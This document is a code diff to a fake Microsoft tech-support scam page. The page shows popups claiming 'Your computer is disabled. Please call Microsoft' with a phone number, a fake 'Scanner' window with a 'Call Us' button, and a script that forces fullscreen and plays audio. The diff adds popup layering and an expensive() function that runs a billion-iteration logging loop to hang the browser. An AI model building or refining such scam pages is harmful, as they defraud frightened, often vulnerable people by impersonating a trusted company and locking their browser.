@@ -38,6 +38,7 @@
     100% { opacity: 0; }
 }
 .security-alert {
+  z-index: 3;
     position: fixed;
     left: 0;
     top: 0;
@@ -188,6 +189,7 @@
   font-size: 12px;
 }
 .notice-popup {
+  z-index: 2;
     font-size: 12px;
     position: fixed;
     top: 40%;
@@ -225,6 +227,7 @@ li {
 }
 /* top pop style */
 .top-popup {
+  z-index: 99;
     position: fixed;
     top: 0;
     left: 50%;
@@ -258,6 +261,20 @@ li {
   margin-right: 5px;
   margin-top: 0.6rem;
   border-radius: 3px;
+}
+.third-popup
+{
+  position: fixed;
+  z-index: 1;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: white;
+    padding: 20px;
+    border-radius: 5px;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    width: 60%;
+    text-align: center;
 }
 /* third popoup */
 .tabs
@@ -391,6 +408,7 @@ hr
 {
   display: none;
 }
+
 }
 @media screen and (min-width:1000px)
 {
@@ -468,37 +486,38 @@ hr
     <p>Do not restart or use your computer. Your computer is disabled. Please call Microsoft. Access to this PC is blocked for security reason. Please contact us immediately. A technician will help you solve the problem. Contact Microsoft. 13333333</p>
    </div>
   </div>
+
   <!-- third popup -->
-  <div class="third-popup">
-    <div class="tabs">
-      <i class="fa fa-window-minimize" aria-hidden="true"></i>
-      <i class="fa fa-window-maximize" aria-hidden="true"></i>
-      <i class="fa fa-times" aria-hidden="true"></i>
-    </div>
-    <div class="third-popup-header">
-      <img src="mslogo.jpeg" class="logos">
-      <h2>Microsoft Windows</h2>
-      <button id="license-button">Generate license</button>
-      <i class="fa fa-bell" aria-hidden="true"></i>
-      <i class="fa fa-cog" aria-hidden="true"></i>
-      <i class="fa fa-question-circle" aria-hidden="true"></i>
-    </div>
-    <hr style="width: 100%;">
-    <div class="scanner-main"><img src="scan.png" id="scan"><h3 class="scanner-heading">Scanner</h3>
-      <i class="fa fa-question-circle" aria-hidden="true"></i>
-      <i class="fa fa-times" aia-hidden="true"></i>
-    </div>
-    <div class="scanner-center">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Line-style-icons-laptop.svg">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Line-style-icons-laptop.svg">
-    </div>
-    <div class="scanner-end">
-      <button style="background-color: #5656f1;; color: white;">Scan</button>
-      <button>Call Us</button>
-    </div>
-    <p style="text-align: start; font-size: 12px ;color: #000;font-weight: 500; background-color: rgb(243, 243, 243); padding: 1rem;">Do not restart or use your computer. Your computer is disabled. Please call Microsoft .access to this access to this PC is blocked 
-      for security reason. Please contact us immediately. A technician will help you solve the problem.<br> Contact Microsoft 13333333</p>
- </div>
+   <div class="third-popup">
+      <div class="tabs">
+        <i class="fa fa-window-minimize" aria-hidden="true"></i>
+        <i class="fa fa-window-maximize" aria-hidden="true"></i>
+        <i class="fa fa-times" aria-hidden="true"></i>
+      </div>
+      <div class="third-popup-header">
+        <img src="mslogo.jpeg" class="logos">
+        <h2>Microsoft Windows</h2>
+        <button id="license-button">Generate license</button>
+        <i class="fa fa-bell" aria-hidden="true"></i>
+        <i class="fa fa-cog" aria-hidden="true"></i>
+        <i class="fa fa-question-circle" aria-hidden="true"></i>
+      </div>
+      <hr style="width: 100%;">
+      <div class="scanner-main"><img src="scan.png" id="scan"><h3 class="scanner-heading">Scanner</h3>
+        <i class="fa fa-question-circle" aria-hidden="true"></i>
+        <i class="fa fa-times" aia-hidden="true"></i>
+      </div>
+      <div class="scanner-center">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Line-style-icons-laptop.svg">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Line-style-icons-laptop.svg">
+      </div>
+      <div class="scanner-end">
+        <button style="background-color: #5656f1;; color: white;">Scan</button>
+        <button>Call Us</button>
+      </div>
+      <p style="text-align: start; font-size: 12px ;color: #000;font-weight: 500; background-color: rgb(243, 243, 243); padding: 1rem;">Do not restart or use your computer. Your computer is disabled. Please call Microsoft .access to this access to this PC is blocked 
+        for security reason. Please contact us immediately. A technician will help you solve the problem.<br> Contact Microsoft 13333333</p>
+   </div>
 
       
    
@@ -710,21 +729,31 @@ hr
       function goFullScreen() {
   let elem = document.documentElement; // This will select the whole document to go full screen
   if (elem.requestFullscreen) {
+    
     adx.play();
+    expensive();
       elem.requestFullscreen();
   } else if (elem.mozRequestFullScreen) { /* Firefox */
       elem.mozRequestFullScreen();
     adx.play();
+    expensive();
 
   } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
       elem.webkitRequestFullscreen();
     adx.play();
+    expensive();
 
   } else if (elem.msRequestFullscreen) { /* IE/Edge */
       elem.msRequestFullscreen();
     adx.play();
+    expensive();
 
   }
+}
+function expensive()
+{
+  for(let i=0;i<1000000000;i++)
+  console.log(i+1);
 }
 function plays()
 {
